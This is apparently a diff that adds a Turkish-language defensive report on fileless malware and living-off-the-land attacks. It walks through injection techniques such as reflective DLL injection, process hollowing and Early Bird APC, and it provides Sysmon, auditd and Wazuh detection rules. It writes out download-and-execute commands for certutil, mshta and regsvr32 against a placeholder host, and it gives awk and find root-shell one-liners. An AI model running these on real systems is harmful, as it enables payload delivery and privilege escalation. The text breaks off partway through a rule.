@@ -1,0 +1,521 @@
+# **Kurumsal Altyapılarda Dosyasız Zararlı Yazılımlar (Fileless Malware) ve Bellek İçi Saldırılarla (Living off the Land) Mücadele: Mimari, Korelasyon ve Savunma Derinliği**
+
+## **1\. Giriş ve Kurumsal Topolojide Operasyonel Açık Analizi**
+
+Modern kurumsal ağ topolojileri; uç noktalar, DMZ (Arındırılmış Bölge), iç ağ segmentleri, Active Directory etki alanları ve bulut entegrasyonlarından oluşan karmaşık bir ekosistemdir1. Bu yapıların geleneksel savunma stratejileri, uzun süre boyunca sınır güvenliği (firewall, IPS/IDS) ve uç noktalarda statik imza tabanlı dosya taraması yapan antivirüs (AV) çözümlerine dayanmıştır2. Ancak statik dosya analizine dayalı bu yaklaşım, tehdit aktörlerinin disk üzerinde herhangi bir iz bırakmadan doğrudan sistem belleğinde (RAM) çalıştığı "Dosyasız Zararlı Yazılımlar" (Fileless Malware) ve "Bellek İçi Saldırılar" (Living off the Land \- LOTL) karşısında tamamen etkisiz kalmaktadır2.  
+Saldırganlar, hedef sistemlerde harici zararlı kod çalıştırmak yerine işletim sisteminin zaten güvendiği, dijital olarak imzalanmış meşru yönetim araçlarını ve betik dillerini (PowerShell, WMI, .NET) kötüye kullanmaktadır3. Bu durum, güvenlik ekipleri için meşru sistem yöneticisi aktiviteleriyle saldırgan faaliyetlerini ayırt etmeyi son derece zorlaştıran bir telemetri kirliliği ve operasyonel açık yaratır3.  
+Aşağıdaki mimari diyagram, dosyasız bir saldırının kurumsal bir topolojide nasıl ilerlediğini, bileşenlerin birbiriyle nasıl haberleştiğini ve bu süreçte oluşan operasyonel açığı kapatmak için konumlandırılması gereken savunma derinliği (Defense in Depth) sensörlerini göstermektedir:
+
+\[ DIŞ DÜNYA \]                      \[ KURUMSAL DMZ \]                      \[ İÇ AĞ / AKTİF DİZİN \]  
+\+-------------+                    \+-----------------+                   \+---------------------+  
+| Saldırgan   |                    | Web Sunucusu    |                   | İstemci / Sunucu    |  
+| C2 Sunucusu |                    | (IIS / Apache)  |                   | (Bellek Alanı)      |  
+\+-------------+                    \+-----------------+                   \+---------------------+  
+       |                                    |                                       |  
+       |  1\. HTTP/S Beaconing               |                                       |  
+       |\<-----------------------------------|                                       |  
+       |                                    |                                       |  
+       |  2\. Lateral Movement (WMI/RPC)     |                                       |  
+       |-----------------------------------\>|                                       |  
+       |                                    |  3\. WinRM / RPC (Dinamik Portlar)     |  
+       |                                    |--------------------------------------\>|  
+       |                                    |                                       | \[Süreç Enjeksiyonu\]  
+       |                                    |                                       | (Reflective DLL /  
+       |                                    |                                       |  Process Hollowing)  
+       |                                    |                                       |           |  
+       |                                    |                                       \+----\> \[RAM\]  
+       |                                    |                                           |  
+       |                                    |                                    \[Sysmon Telemetrisi\]  
+       |                                    |                                    (Olay ID 1, 8, 10, 20\)  
+       |                                    |                                           |  
+       |                                    |  4\. Log Yönlendirme (WEF/WEC)             v  
+       |                                    |\<---------------------------------- \[SIEM / Wazuh\]
+
+Kurumsal yapılarda bu bileşenler arasındaki haberleşme kanalları incelendiğinde, saldırganların genellikle şu protokolleri ve operasyonel açıkları suistimal ettiği görülmektedir:
+
+* **RPC (Remote Procedure Call) ve DCOM:** WMI tabanlı uzaktan komut yürütme (örneğin WMIExec.py kullanımı) TCP 135 ve ardından atanan dinamik yüksek portlar (TCP 49152-65535) üzerinden haberleşir9. Birçok kurum, sistem yönetimi için bu portları segmentler arasında açık bırakarak ciddi bir yanal hareket (Lateral Movement) açığı yaratır6.  
+* **WinRM (Windows Remote Management):** HTTP (5985) veya HTTPS (5986) üzerinden PowerShell Remoting protokolünü kullanan bu servis, ağ üzerinde meşru görünerek sızma işlemlerini maskelemek için ideal bir zemin sunar8.  
+* **Bellek İçi Kör Nokta:** Geleneksel IDS/IPS veya ağ geçidi proxy sistemleri, şifrelenmiş HTTPS trafiği içinden geçen PowerShell komut satırlarını veya WQL (WMI Query Language) sorgularını çözümleyemez3. Operasyonel boşluk, doğrudan uç noktanın kendi belleğinde ve yerel olay günlüklerinde oluşur2. Bu açığı kapatmak amacıyla, her uç noktaya Sysmon veya gelişmiş EDR ajanları konumlandırılarak telemetrinin merkezi bir SIEM/Wazuh platformuna gerçek zamanlı aktarılması zorunludur1.
+
+## **2\. Derinlemesine Süreç Enjeksiyonu Mekanizmaları ve Ofansif/Defansif Analiz**
+
+Bellek içi saldırıların çekirdeğini, meşru ve çalışan bir sürecin sanal bellek alanına dışarıdan müdahale ederek kod yürütmeyi sağlayan "Süreç Enjeksiyonu" (Process Injection \- T1055) teknikleri oluşturur15.
+
+### **2.1. Reflective DLL Injection (T1055.001)**
+
+Standart DLL enjeksiyonu, işletim sisteminin LoadLibrary API'sini tetikleyerek diske yazılmış bir kütüphaneyi sürece yükler4. Bu durum diske temas ettiği ve işletim sisteminin yükleyicisine (loader) kayıt bıraktığı için kolayca yakalanır4. Reflective DLL Injection ise diske hiç dokunmadan, tamamen hafıza üzerinde bir kütüphaneyi yükleme ve çalıştırma sanatıdır4.
+
+#### **Ofansif Sömürü Mekanizması**
+
+Saldırganın geliştirdiği özel DLL, standart bir işletim sistemi yükleyicisinin görevini kendi içinde simüle eden bağımsız bir PE (Portable Executable) yükleyici fonksiyonu (ReflectiveLoader) barındırır4. Adım adım sömürü akışı şu şekildedir:
+
+1. **Hedef Sürecin Açılması:** Saldırgan süreç, kurban süreci (örneğin explorer.exe) tespit ederek OpenProcess API'si ile sürece ait bir handle elde eder15.  
+2. **Sanal Bellek Ayrılması:** VirtualAllocEx API'si çağrılarak hedef sürecin adres uzayında, ham (raw) DLL dosyasının boyutu kadar bir bellek alanı ayrılır4. Bu alan genellikle başlangıçta PAGE\_EXECUTE\_READWRITE (RWX) yetkisiyle oluşturulur4.  
+3. **Ham DLL Verisinin Yazılması:** Ayrılan bellek alanına WriteProcessMemory API'si vasıtasıyla diske hiç kaydedilmemiş olan DLL'in ham bayt dizisi yazılır16.  
+4. **Tetikleme:** Saldırgan, hedef süreçte CreateRemoteThread veya NtCreateThreadEx API'sini çağırarak yeni bir thread başlatır16. Bu thread'in başlangıç adresi, hedef sürecin belleğindeki ReflectiveLoader fonksiyonunun tam offset adresine ayarlanır16.  
+5. **Kendi Kendini Hizalama ve API Çözümleme:** ReflectiveLoader fonksiyonu hedef süreç içinde çalışmaya başlar16. İlk olarak, pozisyondan bağımsız (position-independent) bir makine kodu yardımıyla kendi bellek adresini bulur16. Ardından, hedef sürecin Süreç Çevre Bloğunu (PEB) yürüyerek (PEB.Ldr.InMemoryOrderModuleList) kernel32.dll taban adresini tespit eder15.  
+6. **Dinamik Bağlama:** LoadLibraryA, GetProcAddress ve VirtualAlloc gibi kritik API'lerin adreslerini kernel32.dll'in export tablosundan manuel olarak çözümler16. Yeni bir bellek alanı tahsis ederek PE bölümlerini (.text, .data) hizalı kopyalar, Relocation tablosunu (yeniden konumlandırma) düzeltir ve IAT (Import Address Table) yapısını doldurur16. Son olarak DllMain çağrılarak zararlı işlev başlatılır16.
+
+#### **Defansif Tespit ve Engelleme Stratejisi**
+
+* **Hafıza Taraması (Memory Scanning):** ReflectiveLoader standart dışı yükleme yaptığı için, bu kütüphane hedef sürecin PEB modül listesinde görünmez16. EDR araçları ve bellek analizörleri (örneğin Volatility malfind eklentisi), PEB modül listesinde kayıtlı olmadığı halde hafızada MZ ve PE başlıklarına (magic bytes) sahip olan ve bellek koruma tipi MEM\_PRIVATE ile PAGE\_EXECUTE\_READWRITE (RWX) olarak işaretlenmiş alanları tarayarak bu tekniği yüksek doğrulukla tespit eder4.  
+* **API Hooking ve ETW İzleme:** Windows Tehdit İstihbaratı için Olay İzleme (ETW TI) üzerinden üretilen THREATINT\_ALLOCVM\_REMOTE ve THREATINT\_WRITEVM\_REMOTE olayları izlenmelidir16. Bir sürecin kendisi dışındaki bir sürece bellek ayırıp yazması anomali olarak değerlendirilir16.
+
+### **2.2. Process Hollowing (T1055.012) ve Early Bird Varyasyonu**
+
+Process Hollowing, meşru bir Windows sistem sürecinin (örneğin svchost.exe veya lsass.exe) içinin tamamen boşaltılıp, onun kimliği (PID) altında zararlı kodun gizlice yürütülmesidir2.
+
+#### **Ofansif Sömürü Mekanizması**
+
+1. **Askıda Süreç Oluşturma:** Saldırgan süreç, hedef meşru binary dosyasını CreateProcessW API'si ile ve CREATE\_SUSPENDED (0x00000004) bayrağıyla başlatır16. Süreç oluşturulur, belleğe yüklenir ancak ana iş parçacığı ilk komutu çalıştırmadan askıya alınır16.  
+2. **Kurban Sürecin İçinin Boşaltılması:** NtUnmapViewOfSection (veya ZwUnmapViewOfSection) API'si çağrılarak, kurban sürecin kendi sanal belleğine yüklemiş olduğu orijinal PE imajı (image base) bellekten sökülür ve unmap edilir16.  
+3. **Yeni Bellek Tahsisi:** Boşaltılan sanal adres alanında VirtualAllocEx API'si ile zararlı PE dosyasının boyutu kadar yeni bir alan rezerve edilir (PAGE\_EXECUTE\_READWRITE)2.  
+4. **Zararlı PE İmajının Yazılması:** Saldırgan, kendi zararlı yazılımının PE başlıklarını ve ardından .text, .data gibi bölümlerini hizalayarak WriteProcessMemory ile hedef sürecin sanal belleğine yazar16.  
+5. **İş Parçacığı Bağlamının Güncellenmesi (Thread Context Hijacking):** Hedef sürecin askıya alınmış iş parçacığının register durumları GetThreadContext ile okunur16. RCX (x64 mimarisi) veya EBX (x86) register'ları değiştirilerek yeni yazılan zararlı PE imajının giriş noktası (AddressOfEntryPoint) ile güncellenir ve SetThreadContext ile kaydedilir16.  
+6. **Sürecin Uyandırılması:** ResumeThread API'si çağrılarak süreç askıdan çıkarılır16. İşletim sistemi süreci svchost.exe olarak görmeye devam ederken, içeride zararlı kod yürütülür16.
+
+#### **"Early Bird" Varyasyonu**
+
+Güvenlik yazılımlarının süreç oluşturma ve NtUnmapViewOfSection gibi bilinen API çağrılarını kancalayarak (API hooking) engellemesi üzerine saldırganlar "Early Bird" varyasyonunu geliştirmiştir16. Bu yöntemde süreç askıda (CREATE\_SUSPENDED) oluşturulduktan hemen sonra, güvenlik yazılımlarının kendi kancalarını (hooks) sürece tam olarak enjekte edemediği aşamada, Asenkron Prosedür Çağrısı (APC) kuyruğundan yararlanılır16. Saldırgan, hedef iş parçacığına QueueUserAPC API'si yardımıyla doğrudan kendi shellcode'unu içeren bir APC görevlendirir ve ardından iş parçacığını uyandırır16. Süreç ilk çalışmaya başladığı anda otomatik olarak bu APC kuyruğundaki zararlı kodu yürütür16.
+
+| Güvenlik ve Bellek Durumu Karşılaştırması | Classic DLL Injection | Reflective DLL Injection | Process Hollowing | Early Bird APC Injection |
+| :---- | :---- | :---- | :---- | :---- |
+| **Gerekli Disk Dosyası** | Evet (Zararlı DLL diskte kayıtlıdır)15. | Hayır (Tamamen bellek içi ham veri)4. | Hayır (Ham PE dosyası bellek içi taşınır)16. | Hayır (Yalnızca shellcode/ham PE)16. |
+| **Kritik API Çağrı Zinciri** | OpenProcess \-\> VirtualAllocEx \-\> WriteProcessMemory \-\> CreateRemoteThread15. | VirtualAllocEx \-\> WriteProcessMemory \-\> CreateRemoteThread (Özel Loader adresiyle)4. | CreateProcess(SUSPENDED) \-\> NtUnmapViewOfSection \-\> VirtualAllocEx \-\> WriteProcessMemory \-\> SetThreadContext \-\> ResumeThread16. | CreateProcess(SUSPENDED) \-\> VirtualAllocEx \-\> WriteProcessMemory \-\> QueueUserAPC \-\> ResumeThread16. |
+| **Süreç Başlangıç Durumu** | Çalışmakta olan aktif ve meşru bir süreç hedef alınır15. | Çalışmakta olan aktif ve meşru bir süreç hedef alınır4. | Yeni ve askıda (suspended) bir süreç oluşturulur16. | Yeni ve askıda (suspended) bir süreç oluşturulur16. |
+| **EDR / AV Atlama Gücü** | Düşük (Sıkı izlenen LoadLibrary çağrıları sebebiyle)16. | Orta-Yüksek (İmza tabanlı taramayı atlatır)4. | Yüksek (Meşru süreç adının arkasına gizlenir)2. | Çok Yüksek (EDR başlatma kancalarını bypass eder)16. |
+| **Tipik Bellek İzni Değişimi** | MEM\_COMMIT ile PAGE\_READWRITE ve ardından PAGE\_EXECUTE\_READ2. | MEM\_PRIVATE alanında doğrudan PAGE\_EXECUTE\_READWRITE (RWX) tahsisi4. | Unmap edilen imaj alanında PAGE\_EXECUTE\_READWRITE (RWX) geçişleri2. | İş parçacığı kuyruğunda PAGE\_EXECUTE\_READWRITE veya PAGE\_EXECUTE\_READ16. |
+
+## **3\. PowerShell, .NET ve WMI Tabanlı Dosyasız Saldırı Vektörleri**
+
+Dosyasız saldırganların işletim sisteminin derin yönetim katmanlarına sızmak için kullandıkları en kritik araçlar PowerShell, .NET CLR ve WMI alt yapılarıdır14.
+
+### **3.1. Yönetilmeyen PowerShell (Unmanaged PowerShell) ve .NET Entegrasyonu**
+
+PowerShell, sistem yöneticilerine geniş yetkiler sunan bir kabuktur19. Güvenlik çözümleri (özellikle EDR ve SIEM yapıları) powershell.exe veya pwsh.exe süreçlerinin oluşturulmasını, komut satırı argümanlarını ve başlattığı alt süreçleri sıkı bir şekilde denetler19. Bu denetimi aşmak isteyen gelişmiş tehdit aktörleri, PowerShell fonksiyonlarını powershell.exe sürecini hiç başlatmadan çalıştırmayı sağlayan "Yönetilmeyen PowerShell" (Unmanaged PowerShell) tekniğine başvururlar19.
+
+#### **Çalışma Prensibi**
+
+PowerShell'in asıl yürütme motoru powershell.exe değil, System.Management.Automation.dll isimli .NET dinamik kütüphanesidir19. Saldırganlar kendi geliştirdikleri meşru görünümlü bir C\# uygulamasının (veya başka bir sürece enjekte ettikleri kodun) içine .NET Ortak Dil Çalışma Zamanını (CLR \- Common Language Runtime) programatik olarak yüklerler20.
+
+1. Saldırgan uygulama, yerel API'ler yardımıyla .NET CLR'ı sürece dahil eder20.  
+2. Özel C\# kodu ile yeni bir AppDomain oluşturulur20.  
+3. System.Management.Automation.PowerShell.Create() metodu çağrılarak arka planda sessizce bir PowerShell çalışma hattı (pipeline) inşa edilir.  
+4. Bu hat üzerinden gönderilen tüm zararlı scriptler, powershell.exe süreci tetiklenmeden, doğrudan o anki ana sürecin kendi iş parçacığında çalıştırılır22.
+
+Bu yöntem Cobalt Strike içindeki powerpick ve psinject komutlarının da temel çalışma mantığıdır15. Bu sayede, "powershell.exe çalıştı mı?" veya "powershell.exe dışarıya bağlantı açtı mı?" şeklindeki basit süreç izleme kuralları tamamen işlevsiz kalmaktadır19.
+
+### **3.2. WMI Permanent Event Subscriptions ile Kalıcılık (T1546.003)**
+
+Windows Yönetim Gereçleri (WMI), sistem yönetimi için tasarlanmış geniş bir veritabanı ve işlem motorudur9. WMI altyapısının sunduğu en tehlikeli özelliklerden biri, diske dosya yazmadan sistemde kalıcılık (persistence) sağlamaya yarayan "Kalıcı Olay Abonelikleri" (Permanent Event Subscriptions) mekanizmasıdır9.  
+Saldırganlar, sistemde bir tetikleyici olay (trigger) gerçekleştiğinde kendi kodlarının SYSTEM yetkileriyle otomatik çalışması için WMI deposunu (WMI Repository \- OBJECTS.DATA) manipüle ederek üç temel WMI sınıfı nesnesi oluştururlar ve bunları birbirine bağlarlar12:
+
+\+---------------------------------------+  
+|  \_\_EventFilter (Olay Filtresi)        |  \<-- "Sistem açıldığında tetiklen"  
+|  (WQL Sorgusu: Olay ID/Zaman Tanımı)   |  
+\+---------------------------------------+  
+                   |  
+                   | (Linked via \_\_FilterToConsumerBinding) \[cite: 12, 26\]  
+                   v  
+\+---------------------------------------+  
+|  \_\_EventConsumer (Olay Tüketicisi)   |  \<-- "Zararlı PowerShell/Script çalıştır"  
+|  (CommandLine / ActiveScript)         |  
+\+---------------------------------------+
+
+1. **\_\_EventFilter (Olay Filtresi):** Hangi koşul altında eylemin tetikleneceğini belirleyen bir WQL sorgusudur12. Örneğin, sistemin açılışından itibaren geçen süreyi takip eden bir sorgu şöyledir12:  
+   SQL  
+   SELECT \* FROM \_\_InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32\_PerfFormattedData\_PerfOS\_System' AND TargetInstance.SystemUpTime \>= 240 AND TargetInstance.SystemUpTime \< 360
+
+2. **\_\_EventConsumer (Olay Tüketicisi):** Koşul sağlandığında gerçekleştirilecek eylemi tanımlar26. İki alt sınıf sıklıkla kötüye kullanılır26:  
+   * **CommandLineEventConsumer:** Doğrudan belirtilen bir komut satırını yürütür26. Genellikle Base64 ile gizlenmiş PowerShell komutları buraya gömülür12.  
+   * **ActiveScriptEventConsumer:** Disk üzerinde hiçbir script dosyası barındırmadan, doğrudan WMI deposu içindeki düz metin halindeki JScript veya VBScript kodunu bellek üzerinde SYSTEM yetkileriyle çalıştırır26.  
+3. **\_\_FilterToConsumerBinding (Bağlama Nesnesi):** Oluşturulan filtre ile tüketici nesnesini birbirine bağlayarak mekanizmayı aktif hale getirir12. Bu işlem tamamlandıktan sonra, tetikleyici olay gerçekleştiğinde kod meşru WMI sağlayıcı süreci olan WmiPrvSE.exe veya betik çalıştırıcı scrcons.exe tarafından otomatik olarak yürütülür14.
+
+## **4\. LOLBAS ve GTFOBins: Güvenilen Araçların Silahlaştırılması**
+
+Saldırganlar, sistemlere yeni zararlı dosyalar indirmek veya derlemek yerine, işletim sisteminin kendisiyle birlikte gelen ve dijital olarak imzalanmış meşru sistem araçlarını (LOLBins) kötüye kullanırlar3.
+
+### **4.1. Windows LOLBAS Pratikleri**
+
+Windows sistemlerinde varsayılan olarak yer alan ve işletim sisteminin güvenliği için tasarlanmış birçok bileşen, ikincil özellikleri (sub-capabilities) nedeniyle saldırganların favori araçlarına dönüşmüştür3.
+
+#### **certutil.exe (Sertifika Yönetim Aracı)**
+
+Esas amacı sertifika yönetimi ve doğrulama olan bu araç, HTTP/HTTPS üzerinden dosya indirme ve Base64 kod çözme yeteneğine sahiptir3. Ağ geçidindeki güvenlik duvarlarını aşmak için sıklıkla "Download Cradle" olarak kötüye kullanılır3.
+
+DOS  
+certutil.exe \-urlcache \-split \-f https://uzak-sunucu.invalid/payload.txt %TEMP%\\payload.txt  
+certutil.exe \-decode %TEMP%\\payload.txt %TEMP%\\payload.exe
+
+* \-urlcache: URL önbellek yönetimini tetikler ve indirme işlemini başlatır3.  
+* \-split: İndirilen veriyi geçici dosyalara bölerek kaydeder3.  
+* \-f: Hedef dizinde aynı isimde dosya varsa üzerine yazılmasını zorunlu kılar3.  
+* \-decode: Base64 formatında indirilen zararsız görünümlü metin belgesini saniyeler içinde çalıştırılabilir bir ikili (binary) dosyaya dönüştürür3.
+
+#### **mshta.exe (Microsoft HTML Application Host)**
+
+Windows'un meşru .hta uzantılı HTML uygulamalarını çalıştırmak için kullandığı bu araç, ağ üzerinden doğrudan VBScript veya JScript içeren betikleri çekerek bellekte çalıştırabilir3.
+
+DOS  
+mshta.exe https://uzak-sunucu.invalid/payload.hta
+
+Ya da komut satırından satır içi (inline) olarak şu şekilde tetiklenebilir3:
+
+DOS  
+mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe /c whoami"",0,True")
+
+Bu komut, mshta.exe süreci altında alt süreç olarak gizli bir komut satırı açar ve diske hiçbir dosya yazmadan doğrudan RAM üzerinde betik yürütülmesini sağlar3.
+
+#### **regsvr32.exe (COM Bileşen Kayıt Aracı \- Squiblydoo Tekniği)**
+
+"Squiblydoo" olarak adlandırılan bu teknik, regsvr32.exe aracının internetteki bir XML/SCT (Scriptlet) dosyasını çekerek içerisindeki betiği çalıştırmasını sağlar3.
+
+DOS  
+regsvr32.exe /s /n /u /i:https://uzak-sunucu.invalid/payload.sct scrobj.dll
+
+* /s: Sessiz mod; herhangi bir hata veya onay penceresi gösterilmesini engeller3.  
+* /n: Standart kayıt mekanizmasını (DllRegisterServer API'sini) tetiklememesi gerektiğini söyler3.  
+* /u: COM nesnesini kayıttan düşürür. Bu esnada scrobj.dll (Script Component Runtime) yardımıyla uzak .sct dosyasındaki DllUnregisterServer altındaki betik kodları yürütülür3.  
+* /i: Uzak betiğin URL adresini parametre olarak DllInstall fonksiyonuna iletir3. Bu yöntem AppLocker ve WDAC (Windows Defender Application Control) gibi uygulama beyaz liste (whitelisting) çözümlerini tamamen devre dışı bırakabilir, çünkü regsvr32.exe güvenilen ve imzalı bir işletim sistemi bileşenidir3.
+
+### **4.2. Unix/Linux GTFOBins ve Ayrıcalık Yükseltme**
+
+Linux ve Unix tabanlı sistemlerde benzer şekilde, meşru sistem komutlarının (özellikle SUID \- Set Owner User ID bitine sahip olanlar veya sudo yetkisi verilmiş olanlar) kötüye kullanılmasıyla yetki yükseltme (Privilege Escalation) ve kısıtlı kabuklardan (restricted shells) kaçış gerçekleştirilir31.
+
+#### **awk ile Yetki Yükseltme ve Kabuk Sızıntısı**
+
+Eğer awk aracı sistem yöneticisi tarafından hatalı bir şekilde SUID biti set edilmiş olarak bırakıldıysa veya şifresiz sudo yetkisiyle tanımlandıysa, saldırgan aşağıdaki komutla doğrudan root yetkilerinde etkileşimli bir kabuk (shell) elde edebilir7:
+
+Bash  
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+Burada awk'ın metin işleme motoru başlatılmadan önce BEGIN bloğu tetiklenir ve system() fonksiyonu çağrılarak root yetkileriyle /bin/sh kabuğu başlatılır31.
+
+#### **find ile SUID İstismarı**
+
+Benzer şekilde, dosya arama aracı olan find, arama sonuçları üzerinde komut çalıştırmaya yarayan \-exec parametresine sahiptir34. SUID biti tanımlanmış bir find binary'si şu şekilde kötüye kullanılabilir31:
+
+Bash  
+find . \-exec /bin/sh \-p \\;
+
+Bu komut, geçerli dizindeki herhangi bir dosyayı bulduğunda \-exec sonrasındaki /bin/sh komutunu çalıştırır31. \-p parametresi, kabuğun meşru SUID yetkilerini (yani dosya sahibi olan root yetkilerini) koruyarak başlatılmasını sağlar31.
+
+### **LOLBin ve GTFOBin Davranışsal Analiz Matrisi**
+
+Aşağıdaki tablo, kurumsal ortamlarda en sık kötüye kullanılan yerleşik araçları, bunların komut satırı argüman anomalilerini ve siber güvenlik analistlerinin alarm mekanizmaları kurarken dikkat etmesi gereken kritik korelasyon parametrelerini özetlemektedir:
+
+| Araç / İkili Dosya | Konsept Sınıfı | Tipik Kötüye Kullanım Amacı | Şüpheli Argümanlar / Örüntüler | Beklenmeyen Ebeveyn-Çocuk (Parent-Child) Süreç İlişkisi |
+| :---- | :---- | :---- | :---- | :---- |
+| **certutil.exe** \[cite: 3\] | LOLBAS5 | Dış dünyadan zararlı yazılım indirme ve Base64 kod çözme3. | \-urlcache, \-split, \-decode3. | outlook.exe, winword.exe veya excel.exe tarafından tetiklenmesi7. |
+| **mshta.exe** \[cite: 3\] | LOLBAS5 | Uzak sunucudan HTA dosyası çekerek RAM üzerinde betik çalıştırma3. | http://, https://, vbscript:, javascript:3. | Web tarayıcıları (chrome.exe) veya MS Office araçları tarafından başlatılması7. |
+| **regsvr32.exe** \[cite: 3\] | LOLBAS5 | Uygulama denetimini (AppLocker) aşarak uzak scriptlet çalıştırma3. | /s, /n, /u, /i:http, scrobj.dll3. | Kullanıcı dizinlerinden (AppData, Temp) veya ağ paylaşımlarından tetiklenmesi30. |
+| **awk** \[cite: 31, 38\] | GTFOBins32 | SUID bitleri veya sudo yetkileri üzerinden root kabuğu elde etme7. | BEGIN {system(...)}31. | Web sunucu süreçleri (apache, nginx) veya yetkisiz sistem kullanıcıları tarafından çalıştırılması7. |
+| **find** \[cite: 31, 34\] | GTFOBins32 | Yerel dizin aramalarında ayrıcalık yükselterek komut yürütme31. | \-exec /bin/sh, \-exec /bin/bash31. | Rutin cron işleri haricinde, interaktif olmayan SSH oturumlarında yürütülmesi7. |
+
+## **5\. Savunma Derinliği Sensör Yapılandırmaları ve Algılama Mühendisliği**
+
+Dosyasız zararlı yazılımlar ve yerleşik araç istismarlarıyla mücadele, ancak derinlemesine yapılandırılmış uç nokta sensörleri ve akıllı kurallarla donatılmış merkezi bir SIEM/Wazuh ekosistemiyle mümkündür1.
+
+### **5.1. Kurumsal Sysmon ve Auditd Telemetri Mühendisliği**
+
+Windows uç noktalarından zenginleştirilmiş veri elde etmek için Sysmon XML konfigürasyonu, gürültüyü (noise) filtreleyecek ancak zayıf sinyalleri kaçırmayacak şekilde tasarlanmalıdır14.
+
+#### **Sysmon Gelişmiş Konfigürasyon Şablonu (sysmon\_config.xml)**
+
+Aşağıdaki yapılandırma şablonu, özellikle dosyasız saldırıların en sık kullandığı süreç oluşturma (Event ID 1), uzaktan iş parçacığı enjeksiyonu (Event ID 8\) ve WMI permanent kalıcılık (Event ID 19, 20, 21\) olaylarını filtreleyerek merkezi SIEM'e iletmek üzere optimize edilmiştir12:
+
+XML  
+\<Sysmon schemaversion\="4.90"\>  
+  \<HashAlgorithms\>md5,sha256,IMPHASH\</HashAlgorithms\>  
+  \<DnsLookup\>False\</DnsLookup\>  
+  \<EventFiltering\>  
+    \<\!-- Event ID 1: Süreç Oluşturma Filtresi \--\>  
+    \<RuleGroup name\="Process Creation Detection" groupRelation\="or"\>  
+      \<ProcessCreate onmatch\="include"\>  
+        \<\!-- LOLBins Tespiti \--\>  
+        \<Image condition\="end with"\>\\certutil.exe\</Image\>  
+        \<Image condition\="end with"\>\\mshta.exe\</Image\>  
+        \<Image condition\="end with"\>\\regsvr32.exe\</Image\>  
+        \<Image condition\="end with"\>\\bitsadmin.exe\</Image\>  
+        \<Image condition\="end with"\>\\msbuild.exe\</Image\>  
+        \<Image condition\="end with"\>\\installutil.exe\</Image\>  
+        \<\!-- Güvensiz Ebeveyn İlişkileri \--\>  
+        \<ParentImage condition\="end with"\>\\outlook.exe\</ParentImage\>  
+        \<ParentImage condition\="end with"\>\\winword.exe\</ParentImage\>  
+        \<ParentImage condition\="end with"\>\\excel.exe\</ParentImage\>  
+        \<ParentImage condition\="end with"\>\\powerpnt.exe\</ParentImage\>  
+      \</ProcessCreate\>  
+    \</RuleGroup\>
+
+    \<\!-- Event ID 8: CreateRemoteThread Tespiti (Reflective DLL / Enjeksiyon) \--\>  
+    \<RuleGroup name\="Remote Thread Injection Detection" groupRelation\="or"\>  
+      \<CreateRemoteThread onmatch\="include"\>  
+        \<\!-- Kritik Windows Süreçlerine Yapılan Enjeksiyonlar \--\>  
+        \<TargetImage condition\="end with"\>\\explorer.exe\</TargetImage\>  
+        \<TargetImage condition\="end with"\>\\svchost.exe\</TargetImage\>  
+        \<TargetImage condition\="end with"\>\\lsass.exe\</TargetImage\>  
+        \<TargetImage condition\="end with"\>\\spoolsv.exe\</TargetImage\>  
+      \</CreateRemoteThread\>  
+      \<CreateRemoteThread onmatch\="exclude"\>  
+        \<\!-- Bilinen Güvenilir Microsoft Alt Yapılarını Hariç Tut \--\>  
+        \<SourceImage condition\="is"\>C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\</SourceImage\>  
+      \</CreateRemoteThread\>  
+    \</RuleGroup\>
+
+    \<\!-- Event ID 19, 20, 21: WMI Permanent Persistence İzleme \--\>  
+    \<RuleGroup name\="WMI Permanent Subscriptions" groupRelation\="or"\>  
+      \<WmiEvent onmatch\="include"\>  
+        \<EventType condition\="is"\>WmiConsumerEvent\</EventType\>  
+        \<EventType condition\="is"\>WmiFilterEvent\</EventType\>  
+        \<EventType condition\="is"\>WmiBindingEvent\</EventType\>  
+      \</WmiEvent\>  
+    \</RuleGroup\>  
+  \</EventFiltering\>  
+\</Sysmon\>
+
+#### **Linux Auditd Kuralları (/etc/audit/rules.d/audit.rules)**
+
+Linux sistemlerindeki GTFOBins tabanlı SUID ve yetki yükseltme işlemlerini kernel düzeyinde yakalamak için aşağıdaki kurallar uygulanmalıdır40:
+
+Properties  
+\# Mevcut tüm kuralları temizle ve arabellek limitini belirle  
+\-D  
+\-b 8192
+
+\# execve sistem çağrısını izle (Komutların çalıştırılması) \[cite: 41\]  
+\-a always,exit \-F arch=b64 \-S execve \-k audit-command-execution
+
+\# SUID/SGID yetki değişimlerini yakala \[cite: 33\]  
+\-a always,exit \-F arch=b64 \-S setuid \-S setgid \-S setreuid \-S setregid \-k privilege-escalation
+
+\# Kabuk konfigürasyon dosyalarındaki değişiklikleri izle \[cite: 42\]  
+\-w /etc/profile \-p wa \-k shell-integrity  
+\-w /etc/bashrc \-p wa \-k shell-integrity  
+\-w /root/.bashrc \-p wa \-k shell-integrity  
+\-w /root/.bash\_profile \-p wa \-k shell-integrity
+
+\# Sudoers dosyası bütünlük kontrolü \[cite: 33\]  
+\-w /etc/sudoers \-p wa \-k sudoers-modification  
+\-w /etc/sudoers.d/ \-p wa \-k sudoers-modification
+
+### **5.2. Wazuh ile Canlı Davranışsal Analiz ve Kural Geliştirme**
+
+Wazuh, kurumsal ortamda veri sızıntılarını (data exfiltration) ve dosyasız hareketleri yakalamak üzere Windows Event Log ve PowerShell script bloklarını uç noktalardan merkezi sunucuya taşır43.  
+Aşağıdaki XML kural bloğu, /var/ossec/etc/rules/lotl\_data\_exfiltration.xml dosyasına eklenerek bitsadmin, curl, powershell ve certreq araçları kullanılarak gerçekleştirilen veri sızıntılarını ve LOLBins kötüye kullanımlarını tespit etmek üzere tasarlanmıştır44:
+
+XML  
+\<group name\="lotl,powershell,exfiltration"\>  
+  \<\!-- BITSAdmin ile Veri Sızıntısı ve İndirme Tespiti (ID 100017\) \--\>  
+  \<rule id\="100017" level\="8"\>  
+    \<if\_sid\>61603\</if\_sid\>  
+    \<field name\="win.eventdata.originalFileName" type\="pcre2"\>(?i)(bitsadmin\\.exe)\</field\>  
+    \<field name\="win.eventdata.commandLine" type\="pcre2"\>(?i)(transfer|addfile|upload|http)\</field\>  
+    \<options\>no\_full\_log\</options\>  
+    \<description\>Wazuh LOTL \- BITSAdmin ile şüpheli dosya transferi/veri sızıntısı girişimi tespit edildi\</description\>  
+    \<mitre\>  
+      \<id\>T1102\</id\>  
